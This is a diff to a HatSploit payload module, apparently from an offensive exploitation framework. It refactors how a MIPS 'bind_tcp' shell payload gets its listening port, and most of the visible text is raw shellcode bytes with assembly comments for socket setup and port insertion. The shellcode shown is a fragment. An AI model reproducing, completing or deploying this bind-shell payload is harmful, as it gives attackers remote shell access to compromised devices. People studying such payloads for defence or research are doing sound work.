@@ -23,17 +23,8 @@ class HatSploitPayload(Payload):
         'Type': "bind_tcp"
     }
 
-    options = {
-        'BPORT': {
-            'Description': "Bind port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
     def run(self):
-        bind_port = self.parse_options(self.options)
+        bind_port = self.handler['BPORT']
 
         return (
             b"\xe0\xff\xbd\x27"  # addiu   sp,sp,-32
@@ -47,7 +38,7 @@ class HatSploitPayload(Payload):
             b"\xff\xff\x50\x30"  # andi    s0,v0,0xffff
             b"\xef\xff\x0e\x24"  # li      t6,-17                        ; t6: 0xffffffef
             b"\x27\x70\xc0\x01"  # nor     t6,t6,zero                    ; t6: 0x10 (16)
-            b":bport:port:\x0d\x24"  # li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 8888 (default CBPORT))
+            b":bport:port:\x0d\x24"  # li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 8888 (default RPORT))
             b"\x04\x68\xcd\x01"  # sllv    t5,t5,t6                      ; t5: 0x5c110000
             b"\xfd\xff\x0e\x24"  # li      t6,-3                         ; t6: -3
             b"\x27\x70\xc0\x01"  # nor     t6,t6,zero                    ; t6: 0x2
